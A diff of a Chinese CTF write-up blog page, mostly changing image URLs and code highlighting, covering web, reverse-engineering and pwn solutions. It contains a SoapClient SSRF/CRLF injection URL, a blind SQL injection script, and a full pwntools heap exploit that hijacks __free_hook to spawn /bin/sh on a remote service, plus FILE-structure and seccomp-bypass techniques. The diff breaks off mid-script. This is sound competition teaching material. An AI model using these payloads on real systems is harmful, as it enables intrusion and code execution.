-<p><img src="https://uploader.shimo.im/f/bRjMeqFrp32UYLhe.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/bRjMeqFrp32UYLhe__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>提交id=1</p>
-<p><img src="https://uploader.shimo.im/f/3fKD7v5d8Q4im5Zi.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/3fKD7v5d8Q4im5Zi__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>提示要127.0.0.1，那就是需要ssrf了，观察登陆时的url</p>
 <p><a target="_blank" rel="noopener" href="http://192.144.157.29:8080/a.php?classname=login&param2=1">http://192.144.157.29:8080/a.php?classname=login&amp;param2=1</a></p>
 <p>classname是一个类名字，param2是这个类的第2个参数，这里存在一个任意对象实列化漏洞，输入一个不存在的类</p>
-<p><img src="https://uploader.shimo.im/f/N5m77uXBTPKNKXzh.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/N5m77uXBTPKNKXzh__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>输入php的内置类Exception</p>
-<p><img src="https://uploader.shimo.im/f/cmmkvmvtKbfliW1a.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/cmmkvmvtKbfliW1a__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>内置类SimpleXMLElement</p>
-<p><img src="https://uploader.shimo.im/f/CJhHWjX8uHheYJQA.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/CJhHWjX8uHheYJQA__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>2者都报第二个参数错误，应该是第一个参数被固定了，结合ssrf，想到了内置类soapClient,验证</p>
-<p><a target="_blank" rel="noopener" href="http://192.144.157.29:8080/a.php?classname=soapclient&param2%5Blocation%5D=http://132.232.75.90:8080/&param2%5Buri%5D=1231">http://xxxxxxx/a.php?classname=soapclient&amp;param2[location]=http://vps/&amp;param2[uri]=1231</a></p>
-<p><img src="https://uploader.shimo.im/f/RtanIUbcbpv7DIMc.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<pre><code class="hljs asciidoc"><span class="hljs-link">http://xxxxxxx/a.php?classname=soapclient&amp;param2</span>[<span class="hljs-string">location</span>]=<span class="hljs-link">http://vps/&amp;param2</span>[<span class="hljs-string">uri</span>]=1231</code></pre>
+
+<p><img src="https://images-cdn.shimo.im/RtanIUbcbpv7DIMc__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>但soapclient只能传递get参数，post为自己生成的xml数据，不可控，但soapclient可以自己配置部分请求头如user_agent，并且存在CRLF问题，比如</p>
-<p><img src="https://uploader.shimo.im/f/dgoU7Y2sIGnpE0I0.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/dgoU7Y2sIGnpE0I0__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>构造一个post请求,注意带上cookie</p>
 <pre><code class="hljs plain">http:&#x2F;&#x2F;xxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%26a&#x3D;&amp;param2[uri]&#x3D;123</code></pre>
 
-<p><img src="https://uploader.shimo.im/f/s3YJTHnLxtD7w7gi.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/s3YJTHnLxtD7w7gi__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>更改vps为127.0.0.1，仍然没有flag</p>
-<p><img src="https://uploader.shimo.im/f/0TcaGmGOkB7lW4vC.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/0TcaGmGOkB7lW4vC__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>id参数可能是个注入，尝试注入payload</p>
-<p><img src="https://uploader.shimo.im/f/OiIFWg61E4onnpuL.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/OiIFWg61E4onnpuL__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>存在注入，注入脚本</p>
 <pre><code class="hljs plain">import requests
 #url_template&#x3D;&quot;http:&#x2F;&#x2F;xxxxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%27%20and ascii(substr(database(),&#123;&#125;,1))&#x3D;&#123;&#125;%23%26a&#x3D;&amp;param2[uri]&#x3D;123&quot;
@@ -443,12 +476,12 @@ for j in range(1,50):
             break</code></pre>
 
 <h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="RealEzRE"><a href="#RealEzRE" class="headerlink" title="RealEzRE"></a>RealEzRE</h2><h3 id="1-SMC"><a href="#1-SMC" class="headerlink" title="1. SMC"></a>1. SMC</h3><p>进入主函数后发现几个被加密后的字符串，通过IDA的Findcrypt 插件发现Base64的表，猜测这些字符串是经过Base64编码的，解密后得知是这里是一些提示信息</p>
-<p><img src="https://uploader.shimo.im/f/pviYQEuT7nuD5Ce5.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//pviYQEuT7nuD5Ce5.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>下面的操作是对关键函数区块进行smc解密操作，首先通过sub_401B80函数找到要解密的区块始末地址和大小</p>
-<p><img src="https://uploader.shimo.im/f/HNq1zt20TYye2PVz.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//HNq1zt20TYye2PVz.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>目标区块和0x67异或解密</p>
-<p><img src="https://uploader.shimo.im/f/a7x2sM1wuH3xwmd9.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/0oCOXWt6j0BB8Z2b.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//a7x2sM1wuH3xwmd9.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//0oCOXWt6j0BB8Z2b.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>IDC 脚本</p>
 <pre><code class="hljs c++"><span class="hljs-keyword">auto</span> key = <span class="hljs-number">0x67</span>;
 <span class="hljs-keyword">auto</span> from = <span class="hljs-number">0x401cc0</span> + <span class="hljs-number">0x20</span>;
@@ -465,10 +498,10 @@ Message(<span class="hljs-string">&quot;\n Success \n&quot;</span>);
 ​</code></pre>
 
 <h3 id="2-关键函数"><a href="#2-关键函数" class="headerlink" title="2. 关键函数"></a>2. 关键函数</h3><p>通过一些操作还原了关键函数，查看伪C代码后发现输入的字符串加密后和特定数值分三次比较</p>
-<p><img src="https://uploader.shimo.im/f/MhehI1X8DJXKISOV.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//MhehI1X8DJXKISOV.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <h3 id="3-加密函数"><a href="#3-加密函数" class="headerlink" title="3. 加密函数"></a>3. 加密函数</h3><p><img src="https://uploader.shimo.im/f/Pvyfe6IrtHAzpBth.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
 <p>通过分析知道这是个RC4加密</p>
-<p><img src="https://uploader.shimo.im/f/ZggJEJUbk518mbCM.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//ZggJEJUbk518mbCM.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>解密脚本</p>
 <pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
@@ -517,8 +550,9 @@ Message(<span class="hljs-string">&quot;\n Success \n&quot;</span>);
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag&#123;%s&#125;&quot;</span>, flag);
 &#125;</code></pre>
 
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Stangeapk"><a href="#Stangeapk" class="headerlink" title="Stangeapk"></a>Stangeapk</h2><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>使用jeb3.0打开apk发现字符串被加密了</p>
-<p><img src="https://uploader.shimo.im/f/NsSEoVt9TXvm18Gq.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+
+<h2 id="Stangeapk"><a href="#Stangeapk" class="headerlink" title="Stangeapk"></a>Stangeapk</h2><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>使用jeb3.0打开apk发现字符串被加密了</p>
+<p><img src="https://images-cdn.shimo.im/NsSEoVt9TXvm18Gq__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>查看加密函数发现为异或+base64加密 ，编写解密函数</p>
 <pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Base64;
 <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringFog</span> </span>&#123;
@@ -558,7 +592,7 @@ Message(<span class="hljs-string">&quot;\n Success \n&quot;</span>);
 HttpURLConnection connection = (HttpURLConnection)<span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://121.196.219.16:8080/ForAndroid/mustLogin?logname=1&amp;password=1&quot;</span>).openConnection();</code></pre>
 
 <p>可以发现这是一个http请求，输入账号密码或者直接访问url均可达到目的<br>得到服务器返回的字符串：</p>
-<p><img src="https://uploader.shimo.im/f/I7MKKE2GSURW5GOV.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/I7MKKE2GSURW5GOV__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>根据url下载附件realapp</p>
 <blockquote>
 <p>ps：jeb 3.9及以后会自动解密字符串</p>
@@ -567,8 +601,8 @@ HttpURLConnection connection = (HttpURLConnection)<span class="hljs-keyword">new
 <p>该apk验证流程为:</p>
 <p>对输入内容进行凯撒加密，其中凯撒key被hook了，返回值为18，传入到native层，并对字符串进行异或操作，然后和值进行比较</p>
 <p>hook代码：</p>
-<p><img src="https://uploader.shimo.im/f/2jdDNB54Z7IQsv1h.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/rQ2HnjIWtwOBroox.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//2jdDNB54Z7IQsv1h.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//rQ2HnjIWtwOBroox.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>其中几个重要参数：</p>
 <pre><code class="hljs plain">比较字符串：&#123;122,125,119,121,71,104,84,85,79,99,13,79,99,125,99,107,78,12,110,91,99,122,13,12,91,65&#125;
 异或的值：getInt()函数返回值，一个xtea算法的解密，其中v为&#123;(unsigned int)-355481616,(unsigned int)1654711569&#125;，key为&#123;1,2,3,4&#125;，返回值为v[0]</code></pre>
@@ -637,11 +671,11 @@ HttpURLConnection connection = (HttpURLConnection)<span class="hljs-keyword">new
 <p>flag：luA1s_(2_Easy_To_y0u_!!!</p>
 <h2 id="简陋的vm"><a href="#简陋的vm" class="headerlink" title="简陋的vm"></a>简陋的vm</h2><p>这道题其实就是一个简单的使用c语言模拟执行的vm，本身并没有做什么处理，只需要找到分发器的位置，再将每一条handle解析出来就能还原汇编。</p>
 <p>首先是分发器，利用的是push/ret的方式调用的，获取需要call的函数地址，将参数与返回地址依次入栈，最后压入跳转地址ret就可以了，所以需要动态调试一下。</p>
-<pre><code class="hljs c++">add_call = call_list[vm_call];
+<pre><code class="hljs asm">add_call &#x3D; call_list[vm_call];
 __asm
 &#123;
  push i;
- sub esp, <span class="hljs-number">0x4</span>;
+ sub esp, 0x4;
  mov eax, v_ret;
  mov dword ptr ss : [esp] , eax;
  push add_call;
@@ -778,459 +812,458 @@ p.send(pay)
 	p.recv()
 p.interactive()</code></pre>
 
-<h2 id="tnote"><a href="#tnote" class="headerlink" title="tnote"></a>tnote</h2><pre><code class="hljs plain"># -*- coding: utf-8 -*-
-import sys
-import os
-from pwn import *
-# context.log_level &#x3D; &#39;debug&#39;
-binary &#x3D; &quot;.&#x2F;tnote&quot;
-ip &#x3D; &quot;47.98.229.132&quot;
-port &#x3D; 10000
-elf &#x3D; ELF(binary)
-def pwn(ip, port, debug):
-    if debug &#x3D;&#x3D; 1:
-        sh &#x3D; process(binary)
-        lib &#x3D; elf.libc
-        # lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)	
-    else:
-        sh &#x3D; remote(ip, port)
-        lib &#x3D; ELF(&quot;libc-2.27.so&quot;)	
-        # lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)
-    s       &#x3D; lambda data               :sh.send(str(data))
-    sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))
-    sl      &#x3D; lambda data               :sh.sendline(str(data))
-    sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))
-    r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb,timeout&#x3D;5)
-    ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop,timeout&#x3D;5)
-    irt     &#x3D; lambda                    :sh.interactive()
-    uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))
-    uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))
-    lg      &#x3D; lambda data               :log.success(data)
-    def add(size):
-        sla(&quot;:&quot;,&quot;A&quot;);
-        sla(&quot;?&quot;,str(size));
-    def free(idx):
-        sla(&quot;:&quot;,&quot;D&quot;);
-        sla(&quot;?&quot;,str(idx))
-    def edit(idx,content):
-        sla(&quot;:&quot;,&quot;E&quot;)
-        sla(&quot;?&quot;,str(idx))
-        sa(&quot;:&quot;,content)
-    def show(idx):
-        sla(&quot;:&quot;,&quot;S&quot;)
-        sla(&quot;?&quot;,str(idx))
-    add(0x18)
-    add(0x18)
-    add(0x58)
-    add(0x18)
-    add(0x78)
-    payload &#x3D; &quot;\x11&quot; * 0x18 + p8(0x81)
-    edit(0,payload)
-    free(1)
-    add(0x78)
-    free(4)
-    payload &#x3D; &quot;\x11&quot; * 0x18 + p64(0x81) + &quot;\n&quot;
-    edit(1,payload)
-    free(2)
-    payload &#x3D; &quot;\x11&quot; * 0x18 + p64(0xdeadbeefdeadbeef) + &quot;\n&quot;
-    edit(1,payload)
-    show(1)
-    ru(&quot;\x11&quot; * 0x18 + p64(0xdeadbeefdeadbeef))
-    heap_base &#x3D; uu64(r(6)) - 0x320
-    payload &#x3D; &quot;\x11&quot; * 0x18 + p64(0x81)
-    payload +&#x3D; p64(heap_base + 0x10) + &quot;\n&quot;
-    edit(1,payload)
-    add(0x78)
-    add(0x78)
-    payload &#x3D; p64(0) * 4 + p64(0x0f0f0f0f0f0f0f0f) + p64(0) * 9 + p64(heap_base + 0x10) + &quot;\n&quot;
-    edit(4,payload)
-    free(4)
-    add(0x78)
-    show(4)
-    ru(&quot;content:&quot;)
-    main_arena &#x3D; uu64(r(6))
-    success(&quot;main_arena &#x3D; &quot;+hex(main_arena))
-    libc &#x3D; main_arena - lib.symbols[b&#39;__malloc_hook&#39;] - 96 - 0x10
-    success(&quot;libc &#x3D; &quot;+hex(libc))
-    lib.address &#x3D; libc
-    system &#x3D; lib.symbols[b&#39;system&#39;]
-    __free_hook &#x3D; lib.symbols[b&#39;__free_hook&#39;]
-    success(&quot;libc_base &#x3D; &quot;+hex(libc))
-    success(&quot;sys_addr &#x3D; &quot;+hex(system))
-    payload &#x3D; p64(0) * 4 + p64(0x0f0f0f0f0f0f0f0f) + p64(0) * 9 + p64(__free_hook - 8) + &quot;\n&quot;
-    edit(4,payload)
-    add(0x78)
-    edit(5,&quot;&#x2F;bin&#x2F;sh\x00&quot; + p64(system) + &quot;\n&quot;)
-    free(5)
+<h2 id="tnote"><a href="#tnote" class="headerlink" title="tnote"></a>tnote</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span>
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span>
+binary = <span class="hljs-string">&quot;./tnote&quot;</span>
+ip = <span class="hljs-string">&quot;47.98.229.132&quot;</span>
+port = <span class="hljs-number">10000</span>
+elf = ELF(binary)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip, port, debug</span>):</span>
+    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:
+        sh = process(binary)
+        lib = elf.libc
+        <span class="hljs-comment"># lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)	</span>
+    <span class="hljs-keyword">else</span>:
+        sh = remote(ip, port)
+        lib = ELF(<span class="hljs-string">&quot;libc-2.27.so&quot;</span>)	
+        <span class="hljs-comment"># lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span>
+    s       = <span class="hljs-keyword">lambda</span> data               :sh.send(str(data))
+    sa      = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendafter(str(delim), str(data))
+    sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(str(data))
+    sla     = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendlineafter(str(delim), str(data))
+    r       = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :sh.recv(numb,timeout=<span class="hljs-number">5</span>)
+    ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :sh.recvuntil(delims, drop,timeout=<span class="hljs-number">5</span>)
+    irt     = <span class="hljs-keyword">lambda</span>                    :sh.interactive()
+    uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
+    uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
+    lg      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span>
+        sla(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>);
+        sla(<span class="hljs-string">&quot;?&quot;</span>,str(size));
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span>
+        sla(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;D&quot;</span>);
+        sla(<span class="hljs-string">&quot;?&quot;</span>,str(idx))
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span>
+        sla(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;E&quot;</span>)
+        sla(<span class="hljs-string">&quot;?&quot;</span>,str(idx))
+        sa(<span class="hljs-string">&quot;:&quot;</span>,content)
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span>
+        sla(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>)
+        sla(<span class="hljs-string">&quot;?&quot;</span>,str(idx))
+    add(<span class="hljs-number">0x18</span>)
+    add(<span class="hljs-number">0x18</span>)
+    add(<span class="hljs-number">0x58</span>)
+    add(<span class="hljs-number">0x18</span>)
+    add(<span class="hljs-number">0x78</span>)
+    payload = <span class="hljs-string">&quot;\x11&quot;</span> * <span class="hljs-number">0x18</span> + p8(<span class="hljs-number">0x81</span>)
+    edit(<span class="hljs-number">0</span>,payload)
+    free(<span class="hljs-number">1</span>)
+    add(<span class="hljs-number">0x78</span>)
+    free(<span class="hljs-number">4</span>)
+    payload = <span class="hljs-string">&quot;\x11&quot;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x81</span>) + <span class="hljs-string">&quot;\n&quot;</span>
+    edit(<span class="hljs-number">1</span>,payload)
+    free(<span class="hljs-number">2</span>)
+    payload = <span class="hljs-string">&quot;\x11&quot;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>) + <span class="hljs-string">&quot;\n&quot;</span>
+    edit(<span class="hljs-number">1</span>,payload)
+    show(<span class="hljs-number">1</span>)
+    ru(<span class="hljs-string">&quot;\x11&quot;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>))
+    heap_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x320</span>
+    payload = <span class="hljs-string">&quot;\x11&quot;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x81</span>)
+    payload += p64(heap_base + <span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;\n&quot;</span>
+    edit(<span class="hljs-number">1</span>,payload)
+    add(<span class="hljs-number">0x78</span>)
+    add(<span class="hljs-number">0x78</span>)
+    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x0f0f0f0f0f0f0f0f</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(heap_base + <span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;\n&quot;</span>
+    edit(<span class="hljs-number">4</span>,payload)
+    free(<span class="hljs-number">4</span>)
+    add(<span class="hljs-number">0x78</span>)
+    show(<span class="hljs-number">4</span>)
+    ru(<span class="hljs-string">&quot;content:&quot;</span>)
+    main_arena = uu64(r(<span class="hljs-number">6</span>))
+    success(<span class="hljs-string">&quot;main_arena = &quot;</span>+hex(main_arena))
+    libc = main_arena - lib.symbols[<span class="hljs-string">b&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span>
+    success(<span class="hljs-string">&quot;libc = &quot;</span>+hex(libc))
+    lib.address = libc
+    system = lib.symbols[<span class="hljs-string">b&#x27;system&#x27;</span>]
+    __free_hook = lib.symbols[<span class="hljs-string">b&#x27;__free_hook&#x27;</span>]
+    success(<span class="hljs-string">&quot;libc_base = &quot;</span>+hex(libc))
+    success(<span class="hljs-string">&quot;sys_addr = &quot;</span>+hex(system))
+    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x0f0f0f0f0f0f0f0f</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(__free_hook - <span class="hljs-number">8</span>) + <span class="hljs-string">&quot;\n&quot;</span>
+    edit(<span class="hljs-number">4</span>,payload)
+    add(<span class="hljs-number">0x78</span>)
+    edit(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(system) + <span class="hljs-string">&quot;\n&quot;</span>)
+    free(<span class="hljs-number">5</span>)
     irt()
 
-if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
-	pwn(ip, port, 0)</code></pre>
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+	pwn(ip, port, <span class="hljs-number">0</span>)</code></pre>
 
 <h2 id="corporate-slave"><a href="#corporate-slave" class="headerlink" title="corporate_slave"></a><strong>corporate_slave</strong></h2><p>1）本题为glibc2.27保护全开</p>
 <p>2）题目逻辑比较简单，只有一个add功能，并且漏洞点很明显off by X(null)，通过readSize的索引来往地址中写一个0字节</p>
 <p>3）难点在于如何利用，我们知道当我们malloc一个大的堆块（0x200000）时就会使用mmap来分配堆块，此时堆地址紧挨libc,因此我们可以利用这一点来往libc范围内写0字节，那该往哪里写呢</p>
 <p>4）我们首先需要泄露libc，通过源码我们可以知道要想泄露数据需要完成的流程是：puts-&gt;_IO_file_xsputn-&gt;_IO_file_overflow-&gt;_IO_new_do_write-&gt;_IO_SYSWRITE (fp, data, to_do);通过条件判定我们需要满足以下条件fp-&gt;_flags &amp;~ 0x1000 &amp;&amp; fp-&gt;_IO_read_end  = fp-&gt;_IO_write_base,由于0xfbad2887 &amp; 0x1000已经满足了条件，因此只需要让 fp-&gt;_IO_read_end  = fp-&gt;_IO_write_base即可进入_IO_SYSWRITE (fp, fp-&gt;_IO_write_base,fp-&gt;_IO_write_base-fp-&gt;_IO_write_ptr ),从而泄露libc，那泄露libc之后呢？</p>
-<p><img src="https://uploader.shimo.im/f/4Wrb3Z8dPllRHzK1.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/4Wrb3Z8dPllRHzK1__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>5）我们第三次写0字节考虑往stdin里面写，将fp-&gt;_IO_buf_base的最后一字节写为0,此时io_buf_base恰好指向io_file的头部，因此我们可以伪造整个io_file，那如何getshell呢？</p>
-<p><img src="https://uploader.shimo.im/f/GLzFOo2JkxgRPsk4.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/GLzFOo2JkxgRPsk4__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>6）我们采用二重写入的方法来将另一部分的io_file写入到stdout，从而当puts的时候通过io_str_overflow来获取shell，那如何二重写入，我们研究一下stdin的源码可以知道，程序在写入之后会回调到_IO_getline，而_IO_getline里面判断了fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr是否小于0若小于0则调用__uflow,因此我们需要让fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr小于0，在__uflow里面又调用了_IO_default_uflow而此函数调用了_IO_file_underflow，这里就达成了我们二次写入的条件，我们知道第一次只能读0x84的数据因此剩下我们发送的就会通过_IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);向fp-&gt;_IO_buf_base写入，此时fp-&gt;_IO_buf_base已经被我们修改为了stdout的头部，因此可以实现二次写入，我们布置好stdout结构体的值使其走向io_str_overflow通过以下源码getshell</p>
-<p><img src="https://uploader.shimo.im/f/kUMenw2JTgtqU5bK.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/kUMenw2JTgtqU5bK__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>最后获取flag</p>
 <h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>1.  漏洞点利用了abs()函数本身存在的漏洞缺陷，当输入的是0x80000000的时候，会导致整数溢出，进而导致堆溢出。</p>
 <p>2.  考察了加解密知识，对于输入输出进行了DES_CBC加解密转换，需要掌握des_CBC加解密方法才能正常获取输入输出。</p>
 <p>3.  设置了seccomp限制了system execve函数的利用，也就是说劫持got表的方式不可用，并且禁用了open函数，对于seccomp函数理解不深刻pwn手来说，便以为不能利用open read wirte 的shellcode来读取shellcode了。但其实我只是禁用了64位的open函数，32位的open函数仍可以利用，因此我们写32位的shellcode利用open read write来读取flag。</p>
 <p>4.  具体方式就是劫持stack,利用rop链执行mprotect函数赋予执行权限，然后跳转到shellcode执行shellcode。</p>
-<pre><code class="hljs plain">from PwnContext import *
-import sys
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> PwnContext <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
 reload(sys)
